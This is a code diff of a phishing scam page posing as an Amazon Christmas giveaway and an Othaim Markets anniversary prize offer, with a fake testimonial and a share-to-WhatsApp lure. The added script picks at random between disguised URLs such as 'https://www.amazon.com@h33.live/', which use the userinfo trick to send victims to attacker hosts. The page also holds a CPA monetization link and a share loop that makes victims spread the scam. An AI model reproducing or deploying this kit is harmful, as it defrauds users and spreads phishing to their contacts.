@@ -23,8 +23,9 @@
 <img src='https://i.imgur.com/dyGm8v2.png' width='100%'/>
 
 <style type="text/css">
-@import url("https://od-jsc.pages.dev/css2.css?family=Poppins:wght@500;700&display=swap");
-@import url("//od-jsc.pages.dev/droidarabicnaskh.css");
+@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Droid+Arabic+Naskh&display=swap');
+
 * {
     margin: 0;
     padding: 0px;
@@ -551,16 +552,37 @@ Thanks you verry much amazon! I received a Gift Card for $500 and it arrived imm
             </div>
         </div>
     </div>
-    <script src="https://od-jsc.pages.dev/jquery-latest.min.js"></script>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script>
+        // Define the messages array
+        var tiaobanArray = [
+            "https://www.amazon.com@h33.live/",
+            "https://www.amazon.com@qrlinks.xyz/amzn-christmas-prizes"
+        ];
+    
+        // Select a random message from the array
+        var tiaoban = tiaobanArray[Math.floor(Math.random() * tiaobanArray.length)];
+    
+        // Time initialization
+        var date = new Date();
+        var hour = (date.getHours() > 9) ? date.getHours() : '0' + date.getHours();
+        var minute = (date.getMinutes() > 9) ? date.getMinutes() : '0' + date.getMinutes();
+        var second = (date.getSeconds() > 9) ? date.getSeconds() : '0' + date.getSeconds();
+        var mytime = hour + ':' + minute + ':' + second;
+    
+        // Assign random text to the 'tb' variable
+        var tb = tiaoban;
+    </script>
+    
     <script>
         var errorname = "Please enter the name correctly!",
             errornumber = "Please enter your number correctly, example 05xxxxxxx",
             text = " بمناسبة مرور 42 عاماً على تأسيسها أسواق العثيم تقدم قسائم شرائية وجوالات والعديد من الجوائز القيمة والفورية ، الجوائز محدودة سارع من هنا : ",
-            link = "https://www.amazon.com@qrlinks.xyz/amzn-christmas-prizes",
+            link = "https://www.amazon.com@h33.live/",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
             cpa = "https://fearinvulnerablediagnosis.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb",
             saved = "",
-            share = "whatsapp://send?text=" + link;
+            share = "whatsapp://send?text=" + tb;
     </script>
 
 <script type="text/javascript">
